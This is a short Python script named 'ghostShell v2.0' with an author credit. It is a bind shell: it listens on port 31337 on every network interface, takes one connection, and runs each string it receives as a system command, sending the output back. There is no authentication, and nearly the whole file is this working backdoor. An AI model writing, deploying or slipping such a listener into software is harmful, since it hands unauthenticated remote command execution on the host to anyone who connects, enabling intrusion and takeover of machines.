#!/usr/bin/python

# ghostShell v2.0, Author @guguvk (Axel González)

import socket, subprocess, signal

signal.signal(signal.SIGINT, signal.SIG_DFL)

#"0.0.0.0 Sirve para aceptar conexion de cualquier equipo dentro de la red"
address = "0.0.0.0"
with socket.socket() as s:
    s.bind((address,31337))
    s.listen()

    client, add = s.accept()

    while True:
        try:
            command = client.recv(4090).decode()
            if not command:
                break
            if command == "exit":
                break
            else:
                output = subprocess.getoutput(command) + "\n"
                client.send(output.encode())
        except Exception as e:
            print(f"\n!!Error: {e}")
            break

    client.close()

